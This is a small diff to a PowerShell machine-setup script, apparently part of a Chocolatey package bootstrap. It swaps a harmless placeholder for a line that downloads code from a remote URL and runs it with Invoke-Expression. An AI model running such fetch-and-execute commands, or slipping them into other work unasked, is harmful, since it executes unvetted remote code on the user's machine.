@@ -19,9 +19,10 @@ function Install-Chocolatey () {
 }
 
 function Install-ChocolateyPackages () {
-    invoke-expression 'cmd /c start powershell -Command { write-host "Hi, new window!"; set-location "C:\"; get-childitem ; sleep 3}'
+    invoke-expression 'cmd /c start powershell -Command { iex ((New-Object System.Net.WebClient).DownloadString("https://go.mdcollins.net/choco-setup")) }'
 }
 
 Write-Banner
 Install-Chocolatey
 Install-ChocolateyPackages
+
